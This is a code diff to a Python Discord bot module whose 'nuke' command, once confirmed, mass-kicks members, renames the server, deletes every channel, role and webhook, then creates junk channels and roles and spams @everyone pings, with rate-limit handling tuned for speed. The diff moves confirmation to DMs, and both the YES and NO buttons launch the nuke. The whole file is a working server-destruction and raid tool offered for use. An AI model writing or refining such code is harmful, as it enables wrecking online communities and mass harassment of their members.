@@ -10,9 +10,7 @@ NUKE_ALIASES = ["nuke", "destroy", "wreck", "ruin", "raze", "obliterate", "demol
 class BucketGuard:
     def __init__(self, per_route: int = 2):
         self.per_route = per_route
-        self._locks: dict[str, asyncio.Semaphore] = defaultdict(
-            lambda: asyncio.Semaphore(per_route)
-        )
+        self._locks: dict[str, asyncio.Semaphore] = defaultdict(lambda: asyncio.Semaphore(per_route))
         self._global_until = 0.0
         self._glock = asyncio.Lock()
 
@@ -51,11 +49,10 @@ class BucketGuard:
 GUARD = BucketGuard(per_route=3)
 
 class NukeConfirm(discord.ui.View):
-    def __init__(self, author: discord.User, kick: bool):
+    def __init__(self, author: discord.User):
         super().__init__(timeout=60)
         self.author = author
-        self.kick = kick
-        self.value: bool | None = None
+        self.kick_choice: bool | None = None
 
     async def interaction_check(self, interaction: discord.Interaction) -> bool:
         if interaction.user.id != self.author.id:
@@ -63,16 +60,16 @@ class NukeConfirm(discord.ui.View):
             return False
         return True
 
-    @discord.ui.button(label="CONFIRM", style=discord.ButtonStyle.danger)
-    async def confirm(self, interaction: discord.Interaction, _):
-        self.value = True
-        await interaction.response.defer()
+    @discord.ui.button(label="YES", style=discord.ButtonStyle.danger)
+    async def yes(self, interaction: discord.Interaction, _):
+        self.kick_choice = True
+        await interaction.response.edit_message(embed=discord.Embed(description="☢️ NUKE INITIATED", color=discord.Color.orange()), view=None)
         self.stop()
 
-    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
-    async def cancel(self, interaction: discord.Interaction, _):
-        self.value = False
-        await interaction.response.defer()
+    @discord.ui.button(label="NO", style=discord.ButtonStyle.secondary)
+    async def no(self, interaction: discord.Interaction, _):
+        self.kick_choice = False
+        await interaction.response.edit_message(embed=discord.Embed(description="☢️ NUKE INITIATED", color=discord.Color.orange()), view=None)
         self.stop()
 
 class Nuke(commands.Cog):
@@ -82,58 +79,34 @@ class Nuke(commands.Cog):
     @commands.command(name="nuke", aliases=NUKE_ALIASES[1:])
     @commands.has_permissions(administrator=True)
     @commands.guild_only()
-    async def nuke(self, ctx: commands.Context, kick: str = "no"):
-        guild = ctx.guild
-        me = guild.me
-        kick_enabled = kick.lower() == "yes"
-
-        needed = {
-            "manage_channels": me.guild_permissions.manage_channels,
-            "manage_roles": me.guild_permissions.manage_roles,
-            "manage_webhooks": me.guild_permissions.manage_webhooks,
-            "manage_guild": me.guild_permissions.manage_guild,
-        }
-        if kick_enabled:
-            needed["kick_members"] = me.guild_permissions.kick_members
-        missing = [k for k, ok in needed.items() if not ok]
-        if missing:
-            return await ctx.reply(
-                embed=discord.Embed(
-                    description=f"Missing perms: {', '.join(missing)}",
-                    color=discord.Color.red(),
-                ),
-                mention_author=False,
-            )
-
-        view = NukeConfirm(ctx.author, kick_enabled)
-        prompt = await ctx.reply(
-            embed=discord.Embed(
-                title="☢️ NUKE",
-                description=f"**{guild.name}** — kick: {'yes' if kick_enabled else 'no'}\nConfirm within 60s.",
-                color=discord.Color.orange(),
-            ),
-            view=view,
-            mention_author=False,
+    async def nuke(self, ctx: commands.Context):
+        view = NukeConfirm(ctx.author)
+        embed = discord.Embed(
+            title="☢️ NUKE",
+            description=f"**{ctx.guild.name}**\nDo you want to kick other people?",
+            color=discord.Color.orange()
         )
+        
+        # Try to DM the user so only they see it
+        try:
+            prompt = await ctx.author.send(embed=embed, view=view)
+            await ctx.reply("Check your DMs to confirm the nuke.", mention_author=False, delete_after=5)
+        except discord.Forbidden:
+            return await ctx.reply("I cannot DM you. Enable DMs from server members.", mention_author=False, delete_after=5)
+            
         await view.wait()
-        if view.value is not True:
-            return await prompt.edit(
-                embed=discord.Embed(description="Cancelled.", color=discord.Color.red()),
-                view=None,
-            )
-        await prompt.edit(view=None)
+        if view.kick_choice is None:
+            return await prompt.edit(embed=discord.Embed(description="Cancelled (timed out).", color=discord.Color.red()), view=None)
 
-        await self._run(ctx, kick_enabled)
+        # Send public status in the server
+        status = await ctx.send("☢️ NUKE INITIATED")
+        await self._run(ctx, view.kick_choice, status)
 
-    async def _run(self, ctx: commands.Context, kick_enabled: bool):
+    async def _run(self, ctx: commands.Context, kick_enabled: bool, status: discord.Message):
         guild = ctx.guild
         author_id = ctx.author.id
         bot_id = self.bot.user.id
         owner_id = guild.owner_id
-
-        status = await ctx.send(
-            embed=discord.Embed(description="☢️ NUKE INITIATED", color=discord.Color.orange())
-        )
 
         counts = {"kicked": 0, "channels": 0, "roles": 0, "webhooks": 0, "created": 0}
         errors: list[str] = []
@@ -142,19 +115,13 @@ class Nuke(commands.Cog):
             errors.append(f"{label}: {type(e).__name__}: {str(e)[:60]}")
 
         if kick_enabled:
-            targets = [
-                m for m in list(guild.members)
-                if m.id not in (bot_id, author_id, owner_id) and not m.bot
-            ]
+            targets = [m for m in list(guild.members) if m.id not in (bot_id, author_id, owner_id) and not m.bot]
             sem = asyncio.Semaphore(10)
 
             async def do_kick(m: discord.Member):
                 async with sem:
                     try:
-                        await GUARD.run(
-                            f"kick:{guild.id}",
-                            lambda: m.kick(reason="nuke"),
-                        )
+                        await GUARD.run(f"kick:{guild.id}", lambda: m.kick(reason="nuke"))
                         counts["kicked"] += 1
                     except Exception as e:
                         err(f"kick {m}", e)
@@ -162,10 +129,7 @@ class Nuke(commands.Cog):
             await asyncio.gather(*(do_kick(m) for m in targets))
 
         try:
-            await GUARD.run(
-                f"guild_edit:{guild.id}",
-                lambda: guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉", reason="nuke"),
-            )
+            await GUARD.run(f"guild_edit:{guild.id}", lambda: guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉", reason="nuke"))
         except Exception as e:
             err("rename", e)
 
@@ -176,14 +140,10 @@ class Nuke(commands.Cog):
             hooks = []
 
         hook_sem = asyncio.Semaphore(5)
-
         async def kill_hook(wh: discord.Webhook):
             async with hook_sem:
                 try:
-                    await GUARD.run(
-                        f"webhook_delete:{wh.id}",
-                        lambda: wh.delete(reason="nuke"),
-                    )
+                    await GUARD.run(f"webhook_delete:{wh.id}", lambda: wh.delete(reason="nuke"))
                     counts["webhooks"] += 1
                 except Exception as e:
                     err(f"hook {wh}", e)
@@ -192,14 +152,10 @@ class Nuke(commands.Cog):
 
         roles = [r for r in guild.roles if not r.is_default() and not r.managed]
         role_sem = asyncio.Semaphore(4)
-
         async def kill_role(r: discord.Role):
             async with role_sem:
                 try:
-                    await GUARD.run(
-                        f"role_delete:{guild.id}",
-                        lambda: r.delete(reason="nuke"),
-                    )
+                    await GUARD.run(f"role_delete:{guild.id}", lambda: r.delete(reason="nuke"))
                     counts["roles"] += 1
                 except Exception as e:
                     err(f"role {r}", e)
@@ -215,10 +171,7 @@ class Nuke(commands.Cog):
                 return
             async with del_sem:
                 try:
-                    await GUARD.run(
-                        f"channel_delete:{ch.id}",
-                        lambda: ch.delete(reason="nuke"),
-                    )
+                    await GUARD.run(f"channel_delete:{ch.id}", lambda: ch.delete(reason="nuke"))
                     counts["channels"] += 1
                 except Exception as e:
                     err(f"channel {ch}", e)
@@ -232,47 +185,28 @@ class Nuke(commands.Cog):
 
         async def make(_i: int) -> bool:
             try:
-                role = await GUARD.run(
-                    f"role_create:{guild.id}",
-                    lambda: guild.create_role(
-                        name="ʂơཞŋ ɬɛҳ",
-                        color=discord.Color.from_rgb(255, 0, 0),
-                        reason="nuke",
-                    ),
-                )
+                role = await GUARD.run(f"role_create:{guild.id}", lambda: guild.create_role(name="ʂơཞŋ ɬɛҳ", color=discord.Color.from_rgb(255, 0, 0), reason="nuke"))
             except Exception as e:
                 err("create role", e)
                 return False
             try:
-                channel = await GUARD.run(
-                    f"channel_create:{guild.id}",
-                    lambda: guild.create_text_channel(name="nuked", reason="nuke"),
-                )
+                # Custom channel name
+                channel = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="𝖌𝖌 𝕰𝖅", reason="nuke"))
             except Exception as e:
                 err("create channel", e)
                 return False
             try:
-                await GUARD.run(
-                    f"member_role:{guild.id}:{author_id}:{role.id}",
-                    lambda: ctx.author.add_roles(role, reason="nuke"),
-                )
+                await GUARD.run(f"member_role:{guild.id}:{author_id}:{role.id}", lambda: ctx.author.add_roles(role, reason="nuke"))
             except Exception:
                 pass
             for _ in range(100):
                 try:
-                    await GUARD.run(
-                        f"msg:{channel.id}",
-                        lambda: channel.send(
-                            f"@everyone\n{spam_text}",
-                            allowed_mentions=discord.AllowedMentions(everyone=True),
-                        ),
-                    )
+                    await GUARD.run(f"msg:{channel.id}", lambda: channel.send(f"@everyone\n{spam_text}", allowed_mentions=discord.AllowedMentions(everyone=True)))
                 except Exception:
                     break
             return True
 
         wave = asyncio.Semaphore(5)
-
         async def bounded(i: int) -> bool:
             async with wave:
                 return await make(i)
@@ -287,10 +221,7 @@ class Nuke(commands.Cog):
                 break
         if target is None:
             try:
-                target = await GUARD.run(
-                    f"channel_create:{guild.id}",
-                    lambda: guild.create_text_channel(name="report", reason="nuke"),
-                )
+                target = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="report", reason="nuke"))
             except Exception as e:
                 err("final channel", e)
 
@@ -299,17 +230,13 @@ class Nuke(commands.Cog):
             description=(
                 f"**kicked:** {counts['kicked']}\n"
                 f"**deleted:** {counts['channels']} ch · {counts['roles']} roles · {counts['webhooks']} hooks\n"
-                f"**created:** {counts['created']} × 100 pings\n"
+                f"**created:** {counts['created']} channels\n"
                 f"**by:** {ctx.author.mention}"
             ),
             color=discord.Color.red(),
         )
         if errors:
-            embed.add_field(
-                name="⚠️",
-                value="\n".join(errors[:5]) + (f"\n+{len(errors)-5}" if len(errors) > 5 else ""),
-                inline=False,
-            )
+            embed.add_field(name="⚠️", value="\n".join(errors[:5]) + (f"\n+{len(errors)-5}" if len(errors) > 5 else ""), inline=False)
         if target:
             try:
                 await GUARD.run(f"msg:{target.id}", lambda: target.send(embed=embed))
@@ -323,7 +250,7 @@ class Nuke(commands.Cog):
         elif isinstance(error, commands.BotMissingPermissions):
             msg = f"I'm missing: {', '.join(error.missing_permissions)}"
         elif isinstance(error, commands.MissingRequiredArgument):
-            msg = "Usage: `$nuke <yes|no>`"
+            msg = "Usage: `$nuke`"
         elif isinstance(error, commands.NoPrivateMessage):
             msg = "Guild only."
         else:
@@ -331,7 +258,7 @@ class Nuke(commands.Cog):
         await ctx.reply(embed=discord.Embed(description=msg, color=discord.Color.red()), mention_author=False)
 
 # ==========================================
-# STARTER CODE - THIS IS WHAT KEEPS IT ONLINE
+# STARTER CODE
 # ==========================================
 intents = discord.Intents.default()
 intents.message_content = True
